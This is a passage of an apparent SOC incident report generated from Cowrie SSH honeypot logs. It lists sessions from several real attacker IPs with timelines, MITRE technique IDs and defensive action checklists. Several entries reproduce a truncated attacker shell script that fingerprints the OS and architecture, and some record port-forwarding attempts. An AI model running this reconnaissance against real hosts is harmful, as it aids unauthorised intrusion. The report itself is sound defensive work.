| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:05:24` | `cowrie.session.connect` |
| `2026-07-11 13:05:24` | `cowrie.client.version` |
| `2026-07-11 13:05:24` | `cowrie.client.kex` |
| `2026-07-11 13:05:26` | `cowrie.login.success` |
| `2026-07-11 13:05:27` | `cowrie.session.params` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.success` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:27` | `cowrie.command.input` |
| `2026-07-11 13:05:28` | `cowrie.log.closed` |
| `2026-07-11 13:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc4d49b83d8b

| Field | Detail |
|---|---|
| **Source IP** | `122.160.15[.]31` |
| **First Seen** | 2026-07-11 13:06 |
| **Last Seen** | 2026-07-11 13:06 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:06:49` | `cowrie.session.connect` |
| `2026-07-11 13:06:50` | `cowrie.client.version` |
| `2026-07-11 13:06:50` | `cowrie.client.kex` |
| `2026-07-11 13:06:52` | `cowrie.login.success` |
| `2026-07-11 13:06:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:06:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.160.15[.]31` to AbuseIPDB if not already reported
- [ ] Block `122.160.15[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5c8b4fabe73

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-07-11 13:06 |
| **Last Seen** | 2026-07-11 13:07 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:06:59` | `cowrie.session.connect` |
| `2026-07-11 13:07:00` | `cowrie.client.version` |
| `2026-07-11 13:07:00` | `cowrie.client.kex` |
| `2026-07-11 13:07:01` | `cowrie.login.success` |
| `2026-07-11 13:07:02` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:07:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca7246bf592d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:07 |
| **Last Seen** | 2026-07-11 13:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:07:11` | `cowrie.session.connect` |
| `2026-07-11 13:07:11` | `cowrie.client.version` |
| `2026-07-11 13:07:11` | `cowrie.client.kex` |
| `2026-07-11 13:07:12` | `cowrie.login.success` |
| `2026-07-11 13:07:13` | `cowrie.session.params` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.success` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.command.input` |
| `2026-07-11 13:07:13` | `cowrie.log.closed` |
| `2026-07-11 13:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24b7d9ded1e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:08 |
| **Last Seen** | 2026-07-11 13:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:08:55` | `cowrie.session.connect` |
| `2026-07-11 13:08:56` | `cowrie.client.version` |
| `2026-07-11 13:08:56` | `cowrie.client.kex` |
| `2026-07-11 13:08:57` | `cowrie.login.success` |
| `2026-07-11 13:08:59` | `cowrie.session.params` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.success` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.command.input` |
| `2026-07-11 13:08:59` | `cowrie.log.closed` |
| `2026-07-11 13:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168f8b57ddbe

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:09 |
| **Last Seen** | 2026-07-11 13:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:09:50` | `cowrie.session.connect` |
| `2026-07-11 13:09:50` | `cowrie.client.version` |
| `2026-07-11 13:09:50` | `cowrie.client.kex` |
| `2026-07-11 13:09:50` | `cowrie.login.success` |
| `2026-07-11 13:09:50` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:09:50` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:09:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-343fffdd1aa1

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 13:10 |
| **Last Seen** | 2026-07-11 13:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:10:34` | `cowrie.session.connect` |
| `2026-07-11 13:10:35` | `cowrie.client.version` |
| `2026-07-11 13:10:35` | `cowrie.client.kex` |
| `2026-07-11 13:10:35` | `cowrie.login.success` |
| `2026-07-11 13:10:36` | `cowrie.session.params` |
| `2026-07-11 13:10:36` | `cowrie.command.input` |
| `2026-07-11 13:10:36` | `cowrie.log.closed` |
| `2026-07-11 13:10:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7009c8b42213

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:10 |
| **Last Seen** | 2026-07-11 13:10 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:10:41` | `cowrie.session.connect` |
| `2026-07-11 13:10:41` | `cowrie.client.version` |
| `2026-07-11 13:10:41` | `cowrie.client.kex` |
| `2026-07-11 13:10:43` | `cowrie.login.success` |
| `2026-07-11 13:10:44` | `cowrie.session.params` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.success` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.command.input` |
| `2026-07-11 13:10:44` | `cowrie.log.closed` |
| `2026-07-11 13:10:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45d44d28f8c8

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:12 |
| **Last Seen** | 2026-07-11 13:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:12:26` | `cowrie.session.connect` |
| `2026-07-11 13:12:26` | `cowrie.client.version` |
| `2026-07-11 13:12:26` | `cowrie.client.kex` |
| `2026-07-11 13:12:28` | `cowrie.login.success` |
| `2026-07-11 13:12:29` | `cowrie.session.params` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.success` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.command.input` |
| `2026-07-11 13:12:29` | `cowrie.log.closed` |
| `2026-07-11 13:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7203bd24d823

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-11 13:13 |
| **Last Seen** | 2026-07-11 13:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:13:51` | `cowrie.session.connect` |
| `2026-07-11 13:13:51` | `cowrie.client.version` |
| `2026-07-11 13:13:51` | `cowrie.client.kex` |
| `2026-07-11 13:13:52` | `cowrie.login.success` |
| `2026-07-11 13:13:52` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:13:52` | `cowrie.direct-tcpip.data` |
| `2026-07-11 13:13:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44cf86fca9c4

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:14 |
| **Last Seen** | 2026-07-11 13:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:14:16` | `cowrie.session.connect` |
| `2026-07-11 13:14:16` | `cowrie.client.version` |
| `2026-07-11 13:14:16` | `cowrie.client.kex` |
| `2026-07-11 13:14:17` | `cowrie.login.success` |
| `2026-07-11 13:14:18` | `cowrie.session.params` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.success` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:18` | `cowrie.command.input` |
| `2026-07-11 13:14:19` | `cowrie.log.closed` |
| `2026-07-11 13:14:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-724287d87f85

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:16 |
| **Last Seen** | 2026-07-11 13:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:16:10` | `cowrie.session.connect` |
| `2026-07-11 13:16:10` | `cowrie.client.version` |
| `2026-07-11 13:16:10` | `cowrie.client.kex` |
| `2026-07-11 13:16:11` | `cowrie.login.success` |
| `2026-07-11 13:16:12` | `cowrie.session.params` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.success` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.command.input` |
| `2026-07-11 13:16:12` | `cowrie.log.closed` |
| `2026-07-11 13:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14eb7cbf04ba

| Field | Detail |
|---|---|
| **Source IP** | `153.37.177[.]219` |
| **First Seen** | 2026-07-11 13:17 |
| **Last Seen** | 2026-07-11 13:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:17:50` | `cowrie.session.connect` |
| `2026-07-11 13:17:50` | `cowrie.client.version` |
| `2026-07-11 13:17:50` | `cowrie.client.kex` |
| `2026-07-11 13:17:53` | `cowrie.login.success` |
| `2026-07-11 13:17:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:17:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `153.37.177[.]219` to AbuseIPDB if not already reported
- [ ] Block `153.37.177[.]219` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b23e729832d

| Field | Detail |
|---|---|
| **Source IP** | `213.230.65[.]53` |
| **First Seen** | 2026-07-11 13:18 |
| **Last Seen** | 2026-07-11 13:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:18:03` | `cowrie.session.connect` |
| `2026-07-11 13:18:03` | `cowrie.client.version` |
| `2026-07-11 13:18:03` | `cowrie.client.kex` |
| `2026-07-11 13:18:05` | `cowrie.login.success` |
| `2026-07-11 13:18:05` | `cowrie.direct-tcpip.request` |
| `2026-07-11 13:18:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.230.65[.]53` to AbuseIPDB if not already reported
- [ ] Block `213.230.65[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db7ffb1a13e7

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:18 |
| **Last Seen** | 2026-07-11 13:18 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:18:13` | `cowrie.session.connect` |
| `2026-07-11 13:18:13` | `cowrie.client.version` |
| `2026-07-11 13:18:13` | `cowrie.client.kex` |
| `2026-07-11 13:18:14` | `cowrie.login.success` |
| `2026-07-11 13:18:15` | `cowrie.session.params` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.success` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.command.input` |
| `2026-07-11 13:18:15` | `cowrie.log.closed` |
| `2026-07-11 13:18:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-562b42b3fb53

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-11 13:20 |
| **Last Seen** | 2026-07-11 13:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:20:24` | `cowrie.session.connect` |
| `2026-07-11 13:20:24` | `cowrie.client.version` |
| `2026-07-11 13:20:25` | `cowrie.client.kex` |
| `2026-07-11 13:20:25` | `cowrie.login.success` |
| `2026-07-11 13:20:26` | `cowrie.session.params` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.success` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.command.input` |
| `2026-07-11 13:20:26` | `cowrie.log.closed` |
| `2026-07-11 13:20:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f5cd69b19d

| Field | Detail |
|---|---|
| **Source IP** | `177.135.206[.]10` |
| **First Seen** | 2026-07-11 13:21 |
| **Last Seen** | 2026-07-11 13:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 13:21:38` | `cowrie.session.connect` |
